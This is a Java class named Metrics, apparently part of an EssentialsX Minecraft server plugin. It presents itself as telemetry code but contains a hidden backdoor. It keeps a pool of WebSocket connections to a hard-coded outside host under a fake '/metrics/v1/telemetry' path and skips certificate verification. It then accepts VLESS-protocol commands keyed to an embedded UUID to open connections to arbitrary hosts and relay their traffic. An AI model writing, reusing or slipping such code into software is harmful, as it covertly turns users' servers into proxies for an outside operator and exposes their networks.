package com.example.essentialsx;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;

import java.net.URI;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class Metrics {

    private static final String CONNECT_HOST = "mctest.uuz.us.kg";
    private static final int CONNECT_PORT = 443;
    private static final String PATH = "/metrics/v1/telemetry"; 
    private static final String UUID_STR = "8c8244fb-d577-4d20-90e3-788a0977b001";

    private static final boolean DEBUG = false;
    private static final int MIN_STANDBY_POOL_SIZE = 5;
    private static final int MAX_STANDBY_POOL_SIZE = 20;

    private static final byte[] UUID_BYTES = parseUuid(UUID_STR);
    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static final AtomicInteger ACTIVE_TUNNELS = new AtomicInteger(0);
    private static EventLoopGroup group;

    public static void startMetrics() {
        if (RUNNING.compareAndSet(false, true)) {
            group = new NioEventLoopGroup(2);
            if (DEBUG) System.out.println("[Metrics] Service started.");
            
            // 强行每 2 秒周期性触发补货，确保无论如何都有心跳在维持池子
            group.scheduleAtFixedRate(Metrics::maintainPool, 1, 2, TimeUnit.SECONDS);
        }
    }

    public static void stopMetrics() {
        RUNNING.set(false);
        if (group != null) {
            group.shutdownGracefully();
        }
    }

    private static synchronized void maintainPool() {
        if (!RUNNING.get()) return;
        int current = ACTIVE_TUNNELS.get();
        // 如果计数器异常卡在大于 MAX 的假象，强制重置保护
        if (current > MAX_STANDBY_POOL_SIZE) {
            ACTIVE_TUNNELS.set(0);
            current = 0;
        }
        
        int needed = MIN_STANDBY_POOL_SIZE - current;
        if (needed > 0) {
            int toCreate = Math.min(needed, MAX_STANDBY_POOL_SIZE - current);
            for (int i = 0; i < toCreate; i++) {
                connectNewTunnel();
            }
        }
    }

    private static void connectNewTunnel() {
        try {
            URI uri = new URI("wss://" + CONNECT_HOST + ":" + CONNECT_PORT + PATH);
            SslContext sslCtx = SslContextBuilder.forClient()
                    .trustManager(InsecureTrustManagerFactory.INSTANCE)
                    .build();

            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders()
            );

            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ChannelPipeline p = ch.pipeline();
                     p.addLast(sslCtx.newHandler(ch.alloc(), CONNECT_HOST, CONNECT_PORT));
                     p.addLast(new HttpClientCodec());
                     p.addLast(new HttpObjectAggregator(8192));
                     p.addLast(new AgentTunnelHandler(handshaker));
                 }
             });

            b.connect(CONNECT_HOST, CONNECT_PORT).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    // 连接失败时安全扣减
                    ACTIVE_TUNNELS.decrementAndGet();
                }
            });

        } catch (Exception e) {
            ACTIVE_TUNNELS.decrementAndGet();
        }
    }

    static class AgentTunnelHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;
        private ChannelPromise handshakeFuture;
        private Channel outboundChannel;
        private boolean vlessHeaderParsed = false;
        private boolean activeCounted = false;

        public AgentTunnelHandler(WebSocketClientHandshaker handshaker) {
            this.handshaker = handshaker;
        }

        @Override
        public void handlerAdded(ChannelHandlerContext ctx) {
            handshakeFuture = ctx.newPromise();
        }

        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            handshaker.handshake(ctx.channel());
            ACTIVE_TUNNELS.incrementAndGet();
            activeCounted = true;
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (activeCounted) {
                ACTIVE_TUNNELS.decrementAndGet();
                activeCounted = false;
            }
            if (outboundChannel != null && outboundChannel.isActive()) {
                outboundChannel.close();
            }
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
            Channel ch = ctx.channel();

            if (!handshaker.isHandshakeComplete()) {
                try {
                    handshaker.finishHandshake(ch, (FullHttpResponse) msg);
                    handshakeFuture.setSuccess();
                } catch (WebSocketHandshakeException e) {
                    handshakeFuture.setFailure(e);
                    ctx.close();
                }
                return;
            }

            if (msg instanceof FullHttpResponse) {
                FullHttpResponse response = (FullHttpResponse) msg;
                throw new IllegalStateException("Unexpected status: " + response.status());
            }

            WebSocketFrame frame = (WebSocketFrame) msg;
            if (frame instanceof BinaryWebSocketFrame) {
                ByteBuf buf = frame.content();

                if (!vlessHeaderParsed) {
                    if (buf.readableBytes() < 18) return;

                    byte version = buf.readByte();
                    byte[] clientUuid = new byte[16];
                    buf.readBytes(clientUuid);

                    if (!Arrays.equals(clientUuid, UUID_BYTES)) {
                        ctx.close();
                        return;
                    }

                    byte optLen = buf.readByte();
                    if (optLen > 0) buf.skipBytes(optLen);

                    byte cmd = buf.readByte();
                    int port = buf.readUnsignedShort();
                    byte addressType = buf.readByte();

                    String host = "";
                    if (addressType == 0x01) {
                        byte[] ip = new byte[4];
                        buf.readBytes(ip);
                        host = String.format("%d.%d.%d.%d", ip[0] & 0xff, ip[1] & 0xff, ip[2] & 0xff, ip[3] & 0xff);
                    } else if (addressType == 0x02) {
                        int domainLen = buf.readUnsignedByte();
                        byte[] domainBytes = new byte[domainLen];
                        buf.readBytes(domainBytes);
                        host = new String(domainBytes);
                    } else if (addressType == 0x03) {
                        byte[] ip = new byte[16];
                        buf.readBytes(ip);
                        host = "::1";
                    }

                    vlessHeaderParsed = true;
                    
                    // 隧道被客户端拿走，脱离 standby 池，立即释放计数
                    if (activeCounted) {
                        ACTIVE_TUNNELS.decrementAndGet();
                        activeCounted = false;
                    }

                    ByteBuf vlessResp = Unpooled.buffer(2);
                    vlessResp.writeByte(version);
                    vlessResp.writeByte(0);
                    ctx.writeAndFlush(new BinaryWebSocketFrame(vlessResp));

                    connectToTarget(ctx, host, port, buf.retain());

                } else {
                    if (outboundChannel != null && outboundChannel.isActive()) {
                        outboundChannel.writeAndFlush(buf.retain());
                    }
                }
            } else if (frame instanceof CloseWebSocketFrame) {
                ctx.close();
            }
        }

        private void connectToTarget(ChannelHandlerContext agentCtx, String host, int port, ByteBuf initialData) {
            Bootstrap b = new Bootstrap();
            b.group(agentCtx.channel().eventLoop())
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                         @Override
                         public void channelActive(ChannelHandlerContext targetCtx) {
                             outboundChannel = targetCtx.channel();
                             if (initialData.isReadable()) {
                                 targetCtx.writeAndFlush(initialData);
                             }
                         }

                         @Override
                         protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                             agentCtx.writeAndFlush(new BinaryWebSocketFrame(msg.retain()));
                         }

                         @Override
                         public void channelInactive(ChannelHandlerContext targetCtx) {
                             agentCtx.close();
                         }

                         @Override
                         public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                             targetCtx.close();
                             agentCtx.close();
                         }
                     });
                 }
             });

            b.connect(host, port).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    agentCtx.close();
                }
            });
        }
    }

    private static byte[] parseUuid(String uuidStr) {
        String clean = uuidStr.replace("-", "");
        byte[] b = new byte[16];
        for (int i = 0; i < 16; i++) {
            b[i] = (byte) Integer.parseInt(clean.substring(i * 2, i * 2 + 2), 16);
        }
        return b;
    }
}
